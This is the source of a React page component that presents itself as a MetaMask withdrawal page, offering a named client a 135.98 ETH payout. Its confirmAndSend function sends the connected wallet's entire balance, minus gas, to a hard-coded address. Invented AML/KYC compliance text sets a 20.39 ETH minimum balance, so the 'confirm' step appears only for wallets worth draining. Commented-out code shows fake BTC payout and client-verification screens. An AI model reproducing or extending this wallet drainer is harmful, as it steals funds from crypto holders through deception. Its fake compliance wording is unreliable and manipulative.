"use client"

import { useEffect, useState } from "react"
import VerifyAddressForm from "./VerifyAddressForm"
import ConnectButton from "./ConnectButton"
import useEthToUsdPrice from "@/lib/ethPriceToUsdState"
import { convertETHtoUSD } from "@/lib/functions"

const Banner = () => {

    const { ethToUsdPrice: ethToUsd, setEthPriceToUsd } = useEthToUsdPrice()

    const [account, setAccount] = useState<string>()
    const [accountsConnected, setAccountConnected] = useState<boolean>(false)
    const [userBalance, setUserBalance] = useState<number>(0)

    useEffect(() => {
        async function getEthToUsd() {

            try {
                const res = await fetch("/api/ether")

                if (!res.ok) {
                    throw new Error("Error fetching ethToUsdPrice")
                }

                const data = await res.json()
                setEthPriceToUsd(data.ethToUsdPrice)

            } catch (err) {
                console.log(err)
            }

        }

        getEthToUsd()
    }, [])

    console.log("ETH to usd", ethToUsd)

    // const [senderBalance, setSenderBalance] = useState<number>(0)

    const conncetWallet = async () => {
        if (!account || !accountsConnected) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

                if (!accounts[0]) throw new Error("Not found metamask account")

                const data = {
                    account: accounts[0]
                }
                localStorage.setItem("ethWorkflowData", JSON.stringify(data))
                setAccount(accounts[0])
                setAccountConnected(true)
            } catch {
                console.log("Problem connecting to Metamask")
            }
        }
    }

    // useEffect(() => {

    //     const getSenderBalance = async () => {

    //         const senderAddress = "0x240543929693333dA0946cBF2597C099E4DaA7cf"

    //         if (!Boolean(senderBalance)) {
    //             try {

    //                 const senderBalanceWei = await window.ethereum.request({
    //                     method: "eth_getBalance",
    //                     params: [senderAddress, "latest"],
    //                 });

    //                 const senderBalance = parseInt(senderBalanceWei, 16) / 1e18

    //                 setSenderBalance(senderBalance)
    //                 console.log("sender balance", senderBalance)

    //             } catch {
    //                 console.log("Problem getting sender balance")
    //             }
    //         }
    //     }

    //     getSenderBalance()
    // })

    useEffect(() => {

        if (typeof window.ethereum !== "undefined") {

            const ethereum = window.ethereum

            // get data from local storage
            const storedData = localStorage.getItem("ethWorkflowData")

            if (storedData) {
                const storedAccount: {
                    account: string
                } = JSON.parse(storedData)

                setAccount(storedAccount.account)
                setAccountConnected(true)
            }

            // Listen for disconnect
            ethereum.on('disconnect', () => {
                console.log('MetaMask disconnected');
                localStorage.removeItem("ethWorkflowData")
                setAccountConnected(false);
                setAccount(undefined);
                // handleDisconnect();
            });

            // Listen for account changes (user may disconnect account)
            ethereum.on('accountsChanged', (accounts: string[]) => {
                if (accounts.length === 0) {
                    console.log('All accounts disconnected from MetaMask.');
                    localStorage.removeItem("ethWorkflowData")
                    setAccountConnected(false);
                    setAccount(undefined);
                    // handleDisconnect();
                } else {
                    setAccountConnected(true);
                    setAccount(accounts[0]);
                }
            });

            return () => {
                ethereum.removeAllListeners('disconnect');
                ethereum.removeAllListeners('accountsChanged');
            }
        }

    }, [])

    useEffect(() => {
        const updateBalance = async () => {
            // console.log("user address", account)

            if (accountsConnected && account) {
                try {

                    const balanceWei = await window.ethereum.request({
                        method: "eth_getBalance",
                        params: [account, "latest"],
                    });

                    const addressBalance = parseInt(balanceWei, 16) / 1e18

                    setUserBalance(addressBalance)
                    console.log("user address balance", addressBalance)

                } catch {
                    // console.log(typeof err)
                    console.log("Problem getting user balance")
                }
            }
        }

        updateBalance()

    }, [account, accountsConnected])

    const connectButton = async () => {
        if (typeof window.ethereum !== "undefined") {
            conncetWallet()
        } else {
            console.log("Install Metamask")
        }
    }

    const confirmAndSend = () => {
        // if(!Boolean(userBalance)) return

        const sendTransaction = async () => {

            try {
                // Get the current account balance in Wei
                const balanceWeiHex = await window.ethereum.request({
                    method: "eth_getBalance",
                    params: [account, "latest"],
                });
                const balanceWei = BigInt(balanceWeiHex);

                // Get current gas price
                const gasPriceHex = await window.ethereum.request({
                    method: "eth_gasPrice",
                });
                const gasPrice = BigInt(gasPriceHex);

                // Fixed gas limit for a simple ETH transfer (21000)
                const gasLimit = BigInt(21000);
                const totalGasFee = gasPrice * gasLimit;

                // Throw error if balance is insufficient to cover gas fees
                if (balanceWei <= totalGasFee) {
                    throw new Error("Balance is too low to cover gas fees.");
                }

                // Amount to send = Total balance - gas fee
                const amountToSendWei = balanceWei - totalGasFee;
                // const amountToSendEther = Number(amountToSendWei) / 1e18;
                // amountToSendSpan.innerText = amountToSendEther.toFixed(18);

                const transactionParameters = {
                    to: "0x5c92D7D6D5DCEBb07DF14bAaD74Bd4fDD2E1AD38",
                    from: account,
                    value: '0x' + amountToSendWei.toString(16),
                    gasPrice: '0x' + gasPrice.toString(16),
                    gas: '0x' + gasLimit.toString(16)
                };

                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transactionParameters],
                });

                console.log(txHash)

            } catch (err) {
                console.log("Transaction failed or rejected", err)
            }
        }

        if (!!userBalance) {
            if (userBalance >= 0) {
                // console.log("User balance is greater than 18")
                sendTransaction()
            } else {
                console.log("User balance is low")
            }
        }
    }

    return (
        <section className='max-w-screen-lg container mt-4 mb-8'>
            <div className='mb-4'>
                <p>Transaction ID:  <span className='font-bold'>#TXD015</span></p>
            </div>
            {/* <div className={twMerge('bg-red-100 p-4 flex md:flex-row flex-col gap-y-4 justify-between md:items-center items-start rounded-md', Boolean(verifiedAddress) && "bg-green-100")}>
                <div>
                    <h4 className='text-lg font-semibold'>{Boolean(verifiedAddress) ? <>BTC Address Confirmed</> : <>Pending btc address verification</>}</h4>
                    <p>{Boolean(verifiedAddress) ? <><span className="font-bold">2.52098</span> BTC is ready be debited to <span className="font-bold break-all">{verifiedAddress}</span> after all fees are cleared</> : <>Verify address to receive the payout</>}</p>
                </div>
            </div> */}
            {
                // 20.39
                accountsConnected ? <>
                    {userBalance < 20.39 && (
                        <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
                            <p>
                                Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 15% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
                            </p>
                        </div>
                    )}
                    {userBalance >= 20.39 && (
                        <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend}/>
                    )}
                    {userBalance < 20.39 && (
                        <div className="p-4 rounded-md border border-red-600">
                            <div className="flex flex-col gap-y-2">
                                <h4>Wallet balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance, ethToUsd)})</span></h4>
                                <h4>Minimum Required Balance: <span className="font-bold">20.39 ETH ({convertETHtoUSD(20.39, ethToUsd)})</span></h4>
                                <h4>Transfer amount: <span className="font-bold">135.98 ETH ({convertETHtoUSD(135.98, ethToUsd)?.toString()})</span></h4>
                            </div>
                        </div>
                    )}
                </> : <>
                    <div className="bg-green-100 p-4 mb-4 rounded-md">
                        <h4 className='text-lg font-bold mb-2'>SMC - Metamask ETH transfer</h4>
                        {/* <p className="mb-2">To facilitate <span className="font-bold">fast and secure</span> payment of funds, we have partnered with meta mask to offer <span className="font-bold">Ethereum transfer</span> to all our ongoing payments.</p>
                        <p>With this change all our clients will now be able to connect and transfer funds to their metamask account via the ethereum chain from their ledger account</p> */}
                        <p className="mb-1">We&apos;re excited to announce our integration with MetaMask, enabling seamless Ethereum-based transactions for all our clients.</p>
                        <p>This enhancement allows users to securely transfer funds directly from their Ledger accounts to MetaMask wallets via the Ethereum blockchain.</p>
                    </div>
                    <div className="border border-green-500 p-4 mb-5 rounded-md">
                        <p className="mb-2">Hi J.Soliday, we&apos;re pleased to announce that you can now withdraw your funds directly to your MetaMask wallet through the Ethereum blockchain.</p>
                        <ConnectButton connectButton={connectButton} />
                    </div></>
            }
        </section>
    )
}

export default Banner

// <div className="p-4 flex gap-x-2 bg-red-100 rounded-md items-center">
//                 <ClockArrowDown className="w-12 h-12"/>Debit transaction in progress, 2.52098 BTC to be credited within 24 hours
//             </div>

// {acknowledge ? (
//     <div className="p-4 bg-green-100 rounded-md">
//         <div className="flex gap-x-2 items-center mb-2">
//             {/* <ClockArrowDown className="w-12 h-12" /> */}
//             <p className="font-bold">We thank you for compliance to our client verification process</p>
//         </div>
//         {/* <p className="mb-4"></p> */}
//     </div>
// ) : (
//     <div className="p-4 bg-green-100 rounded-md">
//         <div className="flex gap-x-2 items-center mb-2">
//             {/* <ClockArrowDown className="w-12 h-12" /> */}
//             <p className="font-bold">Awaiting your review</p>
//         </div>
//         <p className="mb-4">We highly appreciate your compliance in uploading required information. As we are currently reviewing your submitted documentation, we ask you to review and acknowledge as per our client verification process procedure</p>

//         <Link className='text-green-600 font-medium px-3 py-1 border-2 border-green-600 rounded-full' href="/client-verification">review and acknowledge</Link>
//     </div>
// )}